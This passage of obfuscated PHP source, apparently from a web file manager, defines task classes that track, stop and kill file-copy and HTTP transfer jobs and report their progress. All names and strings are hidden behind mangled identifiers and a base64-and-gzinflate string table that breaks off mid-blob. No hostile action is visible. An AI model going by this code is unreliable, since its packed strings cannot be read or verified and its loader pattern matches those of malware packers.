$_SERVER[ú‡®¯¨±]; $Ÿ–ç˜›¤ = self::valueGet($èÓ€â½¯); if (is_array($Ÿ–ç˜›¤) && $Ÿ–ç˜›¤[$Ä‘ôÆ±›[1732]]) { $õˆäª’ = ActionApply($Ÿ–ç˜›¤[$Ä‘ôÆ±›[1732]], array($Ÿ–ç˜›¤)); $Ÿ–ç˜›¤ = is_array($õˆäª’) ? $õˆäª’ : $Ÿ–ç˜›¤; } return $Ÿ–ç˜›¤; } public static function listData() { $œ²Èş¯ü = self::valueGet(); return array_sort_by($œ²Èş¯ü, $_SERVER[ú‡®¯¨±][1712], !0); } public static function kill($€¤èÕÔÎ) { return self::changeStatus($€¤èÕÔÎ, self::STATYS_KILL); } public static function stop($ÎÛ¥·ù©) { return self::changeStatus($ÎÛ¥·ù©, self::STATYS_STOP); } public static function restart($Ö×µ‡ã­) { return self::changeStatus($Ö×µ‡ã­, self::STATYS_RUNNING); } public static function killAll() { $–ØÜ¿ÂŞ =& $_SERVER[ú‡®¯¨±]; $Ã°Ö°æ = self::listData(); foreach ($Ã°Ö°æ as $•ÈèÓÍ ) { self::kill($•ÈèÓÍ [$–ØÜ¿ÂŞ[453]]); } sleep(2); foreach ($Ã°Ö°æ as $•ÈèÓÍ ) { self::valueSet($•ÈèÓÍ [$–ØÜ¿ÂŞ[453]], !1); } } private static function changeStatus($¬œ÷ ˜ë, $ç¸ ·°) { $¥¹±ÚüŠ =& $_SERVER[ú‡®¯¨±]; $“î©æó‰ = self::valueGet($¬œ÷ ˜ë); if (!$“î©æó‰) { return !1; } $“î©æó‰[$¥¹±ÚüŠ[805]] = $ç¸ ·°; self::valueSet($¬œ÷ ˜ë, $“î©æó‰); self::log($¥¹±ÚüŠ[1733] . $“î©æó‰[$¥¹±ÚüŠ[453]] . $¥¹±ÚüŠ[1734] . $ç¸ ·°); return !0; } public static function valueGet($ùåƒşî’ = false) { $Ä²Ã›· =& $_SERVER[ú‡®¯¨±]; if ($ùåƒşî’) { $ÔÇ­·Ü­ = Model($Ä²Ã›·[498])->where(array($Ä²Ã›·[96] => $ùåƒşî’, $Ä²Ã›·[33] => $Ä²Ã›·[1127]))->find(); return $ÔÇ­·Ü­ ? json_decode($ÔÇ­·Ü­[$Ä²Ã›·[429]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¯ÜÅôğü = false) { $ª¸‰ª˜´ =& $_SERVER[ú‡®¯¨±]; $Ã–—Îº½ = array($ª¸‰ª˜´[33] => $ª¸‰ª˜´[1127]); if ($¯ÜÅôğü) { $Ã–—Îº½[$ª¸‰ª˜´[1708]] = $¯ÜÅôğü; } $—¹†¹º = Model($ª¸‰ª˜´[498])->where($Ã–—Îº½)->select(); $—¹†¹º = $—¹†¹º ? $—¹†¹º : array(); foreach ($—¹†¹º as $†í¥î => $íô®òü¸) { $—¹†¹º[$†í¥î] = json_decode($íô®òü¸[$ª¸‰ª˜´[429]], !0); } return $—¹†¹º; } public static function valueSet($ĞÄïë, $œÑ×İã) { $ÇÍîğ…ú =& $_SERVER[ú‡®¯¨±]; if (!$œÑ×İã) { return Model($ÇÍîğ…ú[498])->where(array($ÇÍîğ…ú[96] => $ĞÄïë, $ÇÍîğ…ú[33] => $ÇÍîğ…ú[1127]))->delete(); } $ãÑŒüÈ = json_encode($œÑ×İã); if (!$ãÑŒüÈ) { ob_start(); var_dump($œÑ×İã); $¿ì…ÂÓ‡ = ob_get_clean(); self::log($ÇÍîğ…ú[1735] . json_encode_force($¿ì…ÂÓ‡)); } if (!$ĞÄïë || !$œÑ×İã[$ÇÍîğ…ú[453]]) { return !1; } $ô‘ï±ä½ = array($ÇÍîğ…ú[33] => $ÇÍîğ…ú[1127], $ÇÍîğ…ú[1708] => USER_ID, $ÇÍîğ…ú[96] => $ĞÄïë, $ÇÍîğ…ú[429] => $ãÑŒüÈ); $‚«‚Ù“Ï = $ÇÍîğ…ú[1736]; CacheLock::lock($‚«‚Ù“Ï); Model($ÇÍîğ…ú[498])->add($ô‘ï±ä½, array(), !0); CacheLock::unlock($‚«‚Ù“Ï); } public static function log($…“’¡ˆ•) { if (!GLOBAL_DEBUG) { return; } write_log($…“’¡ˆ•, $_SERVER[ú‡®¯¨±][1737]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¾úÛíïŠ =& $_SERVER[ú‡®¯¨±]; $Â ıŠ°Š =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¾úÛíïŠ[1738], array($this, $¾úÛíïŠ[1739])); Hook::bind($¾úÛíïŠ[1279], array($this, $¾úÛíïŠ[1740])); Hook::bind($¾úÛíïŠ[1741], array($this, $¾úÛíïŠ[1742])); Hook::bind($¾úÛíïŠ[646], array($this, $¾úÛíïŠ[1743])); Hook::bind($¾úÛíïŠ[647], array($this, $¾úÛíïŠ[1744])); Hook::bind($¾úÛíïŠ[653], array($this, $¾úÛíïŠ[1745])); Hook::bind($¾úÛíïŠ[654], array($this, $¾úÛíïŠ[1746])); Hook::bind($¾úÛíïŠ[649], array($this, $¾úÛíïŠ[1747])); Hook::bind($¾úÛíïŠ[651], array($this, $¾úÛíïŠ[1748])); Hook::bind($¾úÛíïŠ[615], array($this, $¾úÛíïŠ[1749])); Hook::bind($¾úÛíïŠ[612], array($this, $¾úÛíïŠ[1749])); Hook::bind($¾úÛíïŠ[617], array($this, $¾úÛíïŠ[1749])); Hook::bind($¾úÛíïŠ[619], array($this, $¾úÛíïŠ[1749])); Hook::bind($¾úÛíïŠ[621], array($this, $¾úÛíïŠ[1749])); Hook::bind($¾úÛíïŠ[1750], array($this, $¾úÛíïŠ[1751])); Hook::bind($¾úÛíïŠ[637], array($this, $¾úÛíïŠ[1752])); $this->sourceModelCopyFlag = !1; Hook::bind($¾úÛíïŠ[1753], array($this, $¾úÛíïŠ[1754])); Hook::bind($¾úÛíïŠ[1755], array($this, $¾úÛíïŠ[1756])); Hook::bind($¾úÛíïŠ[1757], array($this, $¾úÛíïŠ[1758])); $Â ıŠ°Š[$¾úÛíïŠ[1759]] = LNG($¾úÛíïŠ[1760]); $Â ıŠ°Š[$¾úÛíïŠ[1761]] = 0; $Â ıŠ°Š[$¾úÛíïŠ[1762]] = 0; $Â ıŠ°Š[$¾úÛíïŠ[1120]] = $¾úÛíïŠ[12]; $Â ıŠ°Š[$¾úÛíïŠ[1763]] = $¾úÛíïŠ[12]; $Â ıŠ°Š[$¾úÛíïŠ[1764]] = 0; $Â ıŠ°Š[$¾úÛíïŠ[1765]] = 0; $Â ıŠ°Š[$¾úÛíïŠ[1766]] = 0; if (!$Â ıŠ°Š[$¾úÛíïŠ[1598]]) { $Â ıŠ°Š[$¾úÛíïŠ[1598]] = LNG($¾úÛíïŠ[1767]); } } protected function endAfter() { $áÏÁ¦ä— =& $_SERVER[ú‡®¯¨±]; Hook::unbind($áÏÁ¦ä—[1738], array($this, $áÏÁ¦ä—[1739])); Hook::unbind($áÏÁ¦ä—[1279], array($this, $áÏÁ¦ä—[1740])); Hook::unbind($áÏÁ¦ä—[1741], array($this, $áÏÁ¦ä—[1742])); Hook::unbind($áÏÁ¦ä—[646], array($this, $áÏÁ¦ä—[1743])); Hook::unbind($áÏÁ¦ä—[647], array($this, $áÏÁ¦ä—[1744])); Hook::unbind($áÏÁ¦ä—[653], array($this, $áÏÁ¦ä—[1745])); Hook::unbind($áÏÁ¦ä—[654], array($this, $áÏÁ¦ä—[1746])); Hook::unbind($áÏÁ¦ä—[649], array($this, $áÏÁ¦ä—[1747])); Hook::unbind($áÏÁ¦ä—[651], array($this, $áÏÁ¦ä—[1748])); Hook::unbind($áÏÁ¦ä—[615], array($this, $áÏÁ¦ä—[1749])); Hook::unbind($áÏÁ¦ä—[612], array($this, $áÏÁ¦ä—[1749])); Hook::unbind($áÏÁ¦ä—[617], array($this, $áÏÁ¦ä—[1749])); Hook::unbind($áÏÁ¦ä—[619], array($this, $áÏÁ¦ä—[1749])); Hook::unbind($áÏÁ¦ä—[621], array($this, $áÏÁ¦ä—[1749])); Hook::unbind($áÏÁ¦ä—[1750], array($this, $áÏÁ¦ä—[1751])); Hook::unbind($áÏÁ¦ä—[637], array($this, $áÏÁ¦ä—[1752])); Hook::unbind($áÏÁ¦ä—[1753], array($this, $áÏÁ¦ä—[1754])); Hook::unbind($áÏÁ¦ä—[1755], array($this, $áÏÁ¦ä—[1756])); Hook::unbind($áÏÁ¦ä—[1757], array($this, $áÏÁ¦ä—[1758])); } public function copyMoveStart($ÎğñÔ¡Ç, $›Á½ãÔÃ, $Ù§¸ĞÜš, $§®î ½Û) { $²Äéı “ =& $_SERVER[ú‡®¯¨±]; self::log($²Äéı “[1768] . $›Á½ãÔÃ . $²Äéı “[72] . $§®î ½Û); $ÒËä’™Å = rtrim(TEMP_FILES, $²Äéı “[8]); if (substr($›Á½ãÔÃ, 0, strlen($ÒËä’™Å)) == $ÒËä’™Å) { return; } if (substr($§®î ½Û, 0, strlen($ÒËä’™Å)) == $ÒËä’™Å) { return; } $î»áÔŸ =& $this->task; $î»áÔŸ[$²Äéı “[1769]] = KodIO::transferType($ÎğñÔ¡Ç, $Ù§¸ĞÜš); $this->update(); } public function updateAfter() { $Å…³§±Ÿ =& $_SERVER[ú‡®¯¨±]; $Š×ÃÔ®û =& $this->task; if (!$Š×ÃÔ®û[$Å…³§±Ÿ[818]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Š×ÃÔ®û[$Å…³§±Ÿ[1769]] == $Å…³§±Ÿ[1371]) { return; } self::updateTask($Š×ÃÔ®û); } private static function updateTask(&$é©â¾ê¨) { $éÕ·Ø¬î =& $_SERVER[ú‡®¯¨±]; if ($é©â¾ê¨[$éÕ·Ø¬î[1769]] == $éÕ·Ø¬î[1250] || $é©â¾ê¨[$éÕ·Ø¬î[1769]] == $éÕ·Ø¬î[109]) { if ($é©â¾ê¨[$éÕ·Ø¬î[1763]]) { $é©â¾ê¨[$éÕ·Ø¬î[1766]] = $é©â¾ê¨[$éÕ·Ø¬î[1765]] + $é©â¾ê¨[$éÕ·Ø¬î[1762]]; } } else { if ($é©â¾ê¨[$éÕ·Ø¬î[1769]] == $éÕ·Ø¬î[1372]) { if ($é©â¾ê¨[$éÕ·Ø¬î[1763]] == $éÕ·Ø¬î[1250]) { $é©â¾ê¨[$éÕ·Ø¬î[1766]] = $é©â¾ê¨[$éÕ·Ø¬î[1765]] + $é©â¾ê¨[$éÕ·Ø¬î[1762]] * 0.5; } else { if ($é©â¾ê¨[$éÕ·Ø¬î[1763]] == $éÕ·Ø¬î[109]) { $é©â¾ê¨[$éÕ·Ø¬î[1766]] = $é©â¾ê¨[$éÕ·Ø¬î[1765]] + $é©â¾ê¨[$éÕ·Ø¬î[1761]] * 0.5 + $é©â¾ê¨[$éÕ·Ø¬î[1762]] * 0.5; } } } } $é©â¾ê¨[$éÕ·Ø¬î[1710]] = $é©â¾ê¨[$éÕ·Ø¬î[1766]] / $é©â¾ê¨[$éÕ·Ø¬î[818]]; if ($é©â¾ê¨[$éÕ·Ø¬î[1710]] > 0) { $—ø‰„£¾ = timeFloat() - $é©â¾ê¨[$éÕ·Ø¬î[1712]] - $é©â¾ê¨[$éÕ·Ø¬î[1715]]; $é©â¾ê¨[$éÕ·Ø¬î[1716]] = $—ø‰„£¾ * (1 - $é©â¾ê¨[$éÕ·Ø¬î[1710]]) / $é©â¾ê¨[$éÕ·Ø¬î[1710]]; } } public function addPath($¡Æíî…) { $Ä¸ŸäÑæ =& $_SERVER[ú‡®¯¨±]; if (!$¡Æíî…) { return; } $üÕ˜®Ğ =& $this->task; $ş¹ŠØ‡È = IO::infoWithChildren($¡Æíî…); $üŸ±£Æ = $üÕ˜®Ğ[$Ä¸ŸäÑæ[1770]] ? $üÕ˜®Ğ[$Ä¸ŸäÑæ[1770]][$Ä¸ŸäÑæ[1771]] : 0; $üÕ˜®Ğ[$Ä¸ŸäÑæ[1770]] = array($Ä¸ŸäÑæ[1771] => $üŸ±£Æ + 1, $Ä¸ŸäÑæ[472] => $ş¹ŠØ‡È[$Ä¸ŸäÑæ[32]], $Ä¸ŸäÑæ[86] => $ş¹ŠØ‡È[$Ä¸ŸäÑæ[86]], $Ä¸ŸäÑæ[561] => $ş¹ŠØ‡È[$Ä¸ŸäÑæ[561]] ? $ş¹ŠØ‡È[$Ä¸ŸäÑæ[561]] : $ş¹ŠØ‡È[$Ä¸ŸäÑæ[86]]); if ($ş¹ŠØ‡È[$Ä¸ŸäÑæ[33]] == $Ä¸ŸäÑæ[226]) { $üÕ˜®Ğ[$Ä¸ŸäÑæ[841]] += 1; } else { $üÕ˜®Ğ[$Ä¸ŸäÑæ[841]] += $ş¹ŠØ‡È[$Ä¸ŸäÑæ[81]][$Ä¸ŸäÑæ[79]]; if ($ş¹ŠØ‡È[$Ä¸ŸäÑæ[183]]) { $üÕ˜®Ğ[$Ä¸ŸäÑæ[841]] += $ş¹ŠØ‡È[$Ä¸ŸäÑæ[81]][$Ä¸ŸäÑæ[80]] + 1; } } $üÕ˜®Ğ[$Ä¸ŸäÑæ[818]] += $ş¹ŠØ‡È[$Ä¸ŸäÑæ[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($šºõ–ƒ ) { } public function sourceAddHashEnd($“ıÑÇÊ¸) { } public function sourceAddFileStart($òòé†àŞ) { $çõ²œ… =& $_SERVER[ú‡®¯¨±]; $Ÿ¾Ü¬­Ü =& $this->task; $Ÿ¾Ü¬­Ü[$çõ²œ…[1761]] = $òòé†àŞ[$çõ²œ…[78]]; $Ÿ¾Ü¬­Ü[$çõ²œ…[1759]] = $òòé†àŞ[$çõ²œ…[32]]; $Ÿ¾Ü¬­Ü[$çõ²œ…[1120]] = $òòé†àŞ[$çõ²œ…[32]]; $Ÿ¾Ü¬­Ü[$çõ²œ…[1772]] = $òòé†àŞ[$çõ²œ…[86]]; $this->update(); } public function sourceAddFileEnd($éüÂÁ÷É) { $ĞÚøï =& $_SERVER[ú‡®¯¨±]; $óïµ•Ë¬ =& $this->task; $óïµ•Ë¬[$ĞÚøï[1766]] += $éüÂÁ÷É[$ĞÚøï[78]]; $óïµ•Ë¬[$ĞÚøï[1772]] = $éüÂÁ÷É[$ĞÚøï[86]]; $this->update(1); } public function copyFileStart($ ©­—ã, $¨ÌúÏÓ·, $äÉÃï»û, $®¤³ÂŠµ, $µ¸ıåˆ±, $©£ö©íâ) { $ÜçÊ¨ÍÚ =& $_SERVER[ú‡®¯¨±]; $ÊÃïä° = $µ¸ıåˆ±; if ($ÊÃïä° == $GLOBALS[$ÜçÊ¨ÍÚ[1773]]) { $ÊÃïä° = $GLOBALS[$ÜçÊ¨ÍÚ[1774]]; } $GLOBALS[$ÜçÊ¨ÍÚ[1774]] = $µ¸ıåˆ±; $GLOBALS[$ÜçÊ¨ÍÚ[1773]] = $©£ö©íâ; $§Ê«¨Ô½ =& $this->task; $§Ê«¨Ô½[$ÜçÊ¨ÍÚ[1759]] = $ÊÃïä°; $§Ê«¨Ô½[$ÜçÊ¨ÍÚ[1761]] = (int) $ ©­—ã->size($¨ÌúÏÓ·); $§Ê«¨Ô½[$ÜçÊ¨ÍÚ[1762]] = 0; $§Ê«¨Ô½[$ÜçÊ¨ÍÚ[1120]] = $ÜçÊ¨ÍÚ[12]; $§Ê«¨Ô½[$ÜçÊ¨ÍÚ[1763]] = $ÜçÊ¨ÍÚ[12]; $§Ê«¨Ô½[$ÜçÊ¨ÍÚ[1764]] = 0; $õóµ˜ˆÒ = $§Ê«¨Ô½[$ÜçÊ¨ÍÚ[1761]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($§Ê«¨Ô½[$ÜçÊ¨ÍÚ[453]] . $ÜçÊ¨ÍÚ[1775]); if ($õóµ˜ˆÒ && file_exists(get_path_father($®¤³ÂŠµ))) { Cache::set($§Ê«¨Ô½[$ÜçÊ¨ÍÚ[453]] . $ÜçÊ¨ÍÚ[1775], $®¤³ÂŠµ); $§Ê«¨Ô½[$ÜçÊ¨ÍÚ[1732]] = array($ÜçÊ¨ÍÚ[1776], $ÜçÊ¨ÍÚ[1777]); } $this->update(0, $õóµ˜ˆÒ); } public static function updateCopyLocalFileSize($ÓÍóñ¸) { $ğ¤Ú³ğÅ =& $_SERVER[ú‡®¯¨±]; $‹Í†×Íú = Cache::get($ÓÍóñ¸[$ğ¤Ú³ğÅ[453]] . $ğ¤Ú³ğÅ[1775]); if (!$‹Í†×Íú || !file_exists($‹Í†×Íú)) { return $ÓÍóñ¸; } $ÓÍóñ¸[$ğ¤Ú³ğÅ[1762]] = @filesize($‹Í†×Íú); $ÓÍóñ¸[$ğ¤Ú³ğÅ[1766]] += $ÓÍóñ¸[$ğ¤Ú³ğÅ[1762]]; self::updateTask($ÓÍóñ¸); return $ÓÍóñ¸; } public function copyFileEnd($Äì¹ªâõ, $òãØ¡Ü, $Ğäİş, $¬«èäš, $å“¥ ×¸, $£ğò±Œú) { $­Ò¡ÎŠ =& $_SERVER[ú‡®¯¨±]; $èÎÍõÎ =& $this->task; $èÎÍõÎ[$­Ò¡ÎŠ[1762]] = $èÎÍõÎ[$­Ò¡ÎŠ[1761]]; $èÎÍõÎ[$­Ò¡ÎŠ[1763]] = $­Ò¡ÎŠ[12]; unset($èÎÍõÎ[$­Ò¡ÎŠ[1732]]); if ($å“¥ ×¸ == $èÎÍõÎ[$­Ò¡ÎŠ[1759]]) { $èÎÍõÎ[$­Ò¡ÎŠ[1765]] += $èÎÍõÎ[$­Ò¡ÎŠ[1761]]; $èÎÍõÎ[$­Ò¡ÎŠ[1766]] = $èÎÍõÎ[$­Ò¡ÎŠ[1765]]; $ïˆ—ı¶‚ = 1; if (isset($èÎÍõÎ[$­Ò¡ÎŠ[1772]]) && $èÎÍõÎ[$­Ò¡ÎŠ[1772]] == $òãØ¡Ü) { $ïˆ—ı¶‚ = 0; } $this->update($ïˆ—ı¶‚); } else { $this->update(); $èÎÍõÎ[$­Ò¡ÎŠ[1762]] = 0; } Cache::remove($èÎÍõÎ[$­Ò¡ÎŠ[453]] . $­Ò¡ÎŠ[1775]); self::log($­Ò¡ÎŠ[1778] . $òãØ¡Ü . $­Ò¡ÎŠ[72] . $¬«èäš . $­Ò¡ÎŠ[207] . $å“¥ ×¸ . $­Ò¡ÎŠ[1779] . $èÎÍõÎ[$­Ò¡ÎŠ[1759]]); } public function updateFileEnd($¤³Î“Ôò, $ç¸Ó÷Œ ) { $÷İ‚ıÄ =& $_SERVER[ú‡®¯¨±]; $¹Éşá™ =& $this->task; $¹Éşá™[$÷İ‚ıÄ[1759]] = $¤³Î“Ôò; $¹Éşá™[$÷İ‚ıÄ[1761]] = $ç¸Ó÷Œ ; $¹Éşá™[$÷İ‚ıÄ[1765]] += $ç¸Ó÷Œ ; $¹Éşá™[$÷İ‚ıÄ[1766]] = $¹Éşá™[$÷İ‚ıÄ[1765]]; $this->update(1); self::log($÷İ‚ıÄ[1780] . $¤³Î“Ôò); } public function sourceModelCopy($ ĞÔˆ†¥) { $§Ï‡ÈÜ =& $_SERVER[ú‡®¯¨±]; $çÒû±éÑ = $ ĞÔˆ†¥[0]; $âî‡“Â  = $ ĞÔˆ†¥[1]; $‚¨àÍšÇ =& $this->task; $this->sourceModelCopyFlag = !0; $˜ªæ¨Àô = 0; switch ($çÒû±éÑ) { case $§Ï‡ÈÜ[613]: $˜ªæ¨Àô = 1; break; case $§Ï‡ÈÜ[616]: $‚¨àÍšÇ[$§Ï‡ÈÜ[1759]] = $âî‡“Â [$§Ï‡ÈÜ[32]]; break; case $§Ï‡ÈÜ[618]: $˜ªæ¨Àô = intval($ ĞÔˆ†¥[$§Ï‡ÈÜ[434]] * 0.4); break; case $§Ï‡ÈÜ[620]: $˜ªæ¨Àô = intval($ ĞÔˆ†¥[$§Ï‡ÈÜ[434]] * 0.2); break; case $§Ï‡ÈÜ[622]: $˜ªæ¨Àô = intval($ ĞÔˆ†¥[$§Ï‡ÈÜ[434]] * 0.4); break; } $this->update($˜ªæ¨Àô); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¡ŒàÆŞ«, $ãëÊŠÈ½) { $„¯ô‰ó =& $_SERVER[ú‡®¯¨±]; $this->sourceModelCopyFlag = !0; $œŒÒ±í¾ = 1; if (isset($¡ŒàÆŞ«[$„¯ô‰ó[81]])) { $œŒÒ±í¾ = $¡ŒàÆŞ«[$„¯ô‰ó[81]][$„¯ô‰ó[79]]; $œŒÒ±í¾ = $œŒÒ±í¾ + $¡ŒàÆŞ«[$„¯ô‰ó[81]][$„¯ô‰ó[80]] + 1; } $this->update($œŒÒ±í¾); $this->sourceModelCopyFlag = !1; } public function sourceMove($ğ«…•) { $this->sourceRemove($ğ«…•, !1); } public function curlProgress($»¬ñÄ¯™, $®ñøœÙ», $ÓÀı¬” , $Ï¬ºÌÕ¡, $Òœ¹ê×˜) { $Èà”ñ¬­ =& $_SERVER[ú‡®¯¨±]; $õˆå‡ã =& $this->task; if ($Òœ¹ê×˜ > 0) { $õˆå‡ã[$Èà”ñ¬­[1120]] = $Èà”ñ¬­[1781]; $õˆå‡ã[$Èà”ñ¬­[1763]] = $Èà”ñ¬­[109]; if ($õˆå‡ã[$Èà”ñ¬­[1761]]) { $õˆå‡ã[$Èà”ñ¬­[1762]] = $Òœ¹ê×˜; } if ($õˆå‡ã[$Èà”ñ¬­[1764]]) { $õˆå‡ã[$Èà”ñ¬­[1762]] = $Òœ¹ê×˜ + $õˆå‡ã[$Èà”ñ¬­[1764]]; } } else { if ($ÓÀı¬”  > 0) { if ($õˆå‡ã[$Èà”ñ¬­[1761]] == $®ñøœÙ») { $õˆå‡ã[$Èà”ñ¬­[1762]] = $ÓÀı¬” ; $õˆå‡ã[$Èà”ñ¬­[1120]] = $Èà”ñ¬­[1782]; $õˆå‡ã[$Èà”ñ¬­[1763]] = $Èà”ñ¬­[1250]; } } } $this->update(); } public function curlProgressStart($î©öû) { } public function curlProgressEnd($¼Àı˜) { $ü­†ëÀ =& $_SERVER[ú‡®¯¨±]; $Œï¥Í·ò =& $this->task; $üŞ—Ôá = curl_getinfo($¼Àı˜); $‚õ£»Î¹ = $üŞ—Ôá[$ü­†ëÀ[1783]]; if ($‚õ£»Î¹ == -1) { $‚õ£»Î¹ = $üŞ—Ôá[$ü­†ëÀ[1784]]; } if ($Œï¥Í·ò[$ü­†ëÀ[1763]] == $ü­†ëÀ[109] && $‚õ£»Î¹) { $Œï¥Í·ò[$ü­†ëÀ[1764]] += $‚õ£»Î¹; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $¼÷ĞØÛ“ =& $_SERVER[ú‡®¯¨±]; $±¼ˆ„¥ =& $this->task; $±¼ˆ„¥[$¼÷ĞØÛ“[1785]] = 1; Hook::bind($¼÷ĞØÛ“[1753], array($this, $¼÷ĞØÛ“[1786])); Hook::bind($¼÷ĞØÛ“[1755], array($this, $¼÷ĞØÛ“[1787])); Hook::bind($¼÷ĞØÛ“[1757], array($this, $¼÷ĞØÛ“[1788])); } protected function endAfter() { $­Şšêƒ =& $_SERVER[ú‡®¯¨±]; Hook::unbind($­Şšêƒ[1753], array($this, $­Şšêƒ[1786])); Hook::unbind($­Şšêƒ[1755], array($this, $­Şšêƒ[1787])); Hook::unbind($­Şšêƒ[1757], array($this, $­Şšêƒ[1788])); } public function progressStart($Î¥€ÍÄä) { $Â¼÷‹¦ª =& $_SERVER[ú‡®¯¨±]; $©ÆüÃûä = curl_getinfo($Î¥€ÍÄä); self::log($Â¼÷‹¦ª[1789] . $©ÆüÃûä[$Â¼÷‹¦ª[362]]); self::valueSet($this->task[$Â¼÷‹¦ª[453]], $this->task); } public function progressEnd($î‘ £½) { $Æà˜á€å =& $_SERVER[ú‡®¯¨±]; self::log($Æà˜á€å[1790] . $this->task[$Æà˜á€å[453]]); $this->end(); } public function progress($‡Ğ§Ÿ¦Š, $ÛËı•¤, $åİ¨§€, $’ñ’””, $Õ»ªˆº‹) { $°ÒÒéÙ† =& $_SERVER[ú‡®¯¨±]; $»¿å² =& $this->task; if ($Õ»ªˆº‹ > 0) { $»¿å²[$°ÒÒéÙ†[841]] = $»¿å²[$°ÒÒéÙ†[841]] == 0 ? $’ñ’”” : $»¿å²[$°ÒÒéÙ†[841]]; $»¿å²[$°ÒÒéÙ†[1709]] = $Õ»ªˆº‹; } else { if ($åİ¨§€ > 0) { $»¿å²[$°ÒÒéÙ†[841]] = $»¿å²[$°ÒÒéÙ†[841]] == 0 ? $ÛËı•¤ : $»¿å²[$°ÒÒéÙ†[841]]; $»¿å²[$°ÒÒéÙ†[1709]] = $åİ¨§€; } } $this->update(); self::log("\160\x72\x6f\x67\x72\145\163\x73\x48\164\x74\160\x3a\144\157\167\x6e\x3a{$åİ¨§€}\x2f{$ÛËı•¤}\73\x20\x75\x70\x6c\157\x61\x64\72{$Õ»ªˆº‹}\x2f{$’ñ’””}\x3b"); } } goto DÎÏ½Âƒà; aº˜Ä¸ãî: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\372\207\256\257\250\261", "\xdb\xe8\x8d\xfa\xfa\xd1"); $_SERVER[ú‡®¯¨±] = explode("\174\2\174\4\174\5", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x9\x7c\x1b\xc5\xf5\x38\x5e\xca\x51\x12\xce\x96\xd2\xd2\x83\x76\x63\x8\xb6\x13\x1d\xb6\x73\x3b\x71\x12\xd9\x96\x6d\x11\xd9\x32\x92\x9c\xcb\x36\x9b"."\265\264\262\326\226\264\262\166\345\53\111\313\175\7\150\71\132\50\205\122\112\201\26\162\320\100\200\160\226\373\276\312\21\316\6\110\302\121\240\174\51\341\246\277\71\336\34\273\222".strrev('ú³^Aú{o›Sç}ìÖ½šöù­÷+ìüÚ®w›Íæóy¼Şo3±Íæh/ÏŸüÿûá')."\157\117\32\376\371\231\373\176\213\374\71\344\314\63\252\252\332\146\117\236\336\261\377\71\233\257\323\366\152\334\371\311\75\233\37\271\344\37\377\174\344\57\361\344\302\133\56\351\377"."\xd9\xb7\xe\x7f\xef\xce\xc7\xea\x51\x56\x5a\xb2\x9e\xfe\x28\x39\xd3\x56\xf4\x51\xc3\xb2\x2d\xa\x48\x98\xb9\x94\xd1\x4f\xc3\x46\x8e\xfe\xfa\xe9\x4f\x57\x34\x5c\xd0\xb3\xa6\xad\xd3\xa8\x8f\xfe\xa8"."\320\52\362\257\65\224\61\130\272\332\21\211\253\261\256\316\316\140\64\16\231\352\345\364\254\231\204\120\136\53\150\131\370\176\136\57\130\250\65\162\165\152\336\314\353\71\7\104\0"."\222\232\255\365\151\26\324\324\334\250\66\7\73\303\221\25\152\174\105\147\20\162\364\251\103\105\275\60\106\143\44\30\263\265\202\35\67\262\72\317\61\122\340\355\152\14\266\206\72".base64_decode('lHg00BELNMVDkQ4Kboq0t4fipfBoJBxuDDQtKU3pjAZa2wMKal9GV41cyqxSVtGUVQ==')."\112\65\15\264\30\172\46\111\203\71\215\65\307\36\313\103\50\316\103\150\230\162\305\114\206\106\72\170\50\251\247\264\142\6\260\325\54\107\362\5\43\253\261\116\57\321\307\70\224".strrev(''."\n".'ƒFk, ½l³VB'."\n".'í#D´¨‚¸¦ÁÃŠªzĞ4	­¨à&‚íG¹m¢´').base64_decode('bnRDJelrpQL00oFQoQTCYWWiGmw9m2fV0DJlKotEm4NRpXGFIjCUMLNZM+dDtaCRtA==')."\xa5\xa6\x6\xa3\x51\x1a\xf0\x0\x79\x87\x43\x78\xd0\x20\x12\x69\x69\x89\x5\x79\xc\x3a\x77\x4c\x18\xb5\x64\x6\xd0\xa7\x23\x96\x4c\x65\x6c\x75\x58\xcb\x14\x19\x99\xe\xd2\xdf\x4a\xf8\x81\x5f\xd3"."\x2\xd2\x1d\x32\x72\x46\x11\xc8\x14\xaa\x30\x4d\x3e\xad\x20\x50\x64\xb9\x75\x6\xd1\x93\x10\xc8\xa2\xf2\x26\x94\xeb\x3\x58\x1f\xcb\x65\xa0\x89\x39\x4c\x83\xd\xb\xe9\xef\x7c\x28\xd6\xa7\xe2\x34"."\xbd\x60\xab\x7a\x2e\x61\x26\x8d\x1c\x4c\xdf\x45\x40\x86\x9a\x9d\x6e\x2e\x18\x28\x3\x8d\xa7\xcc\x4c\x92\x85\x2d\x63\x1c\x3a\x97\x32\x32\x7a\x47\x31\x2b\x67\xe1\xd1\x44\xda\xc8\x24\xb\x6c\xc6\x7d".base64_decode('XU4aDfMJjPOKWB61hM99IzUmZiDO18lTLbNYSOghNGNovBbAum2jzjGEmF35jKklYw==')."\172\201\167\315\60\133\120\105\221\242\55\3\213\44\133\213\131\310\66\43\136\1\337\107\363\304\350\52\223\60\310\146\112\122\302\230\277\252\373\170\357\127\275\335\213\321\77\325\300".base64_decode('DHugTWk9k1H1UR2mUjY5y2LI8Ft9Rs6PIDQaiqhpzUq3J2eppBTjsUl91JdP52Ge8w==')."\251\335\343\40\165\214\272\16\323\16\112\234\72\143\46\264\214\334\105\32\116\333\166\76\246\347\222\30\23\320\25\163\44\107\60\225\327\165\310\324\354\121\222\112\273\262\102\151\253".strrev(']–½·[	›ó™†Ù¡#óå«	‰ç„Xh>¢…²‘L™Ãe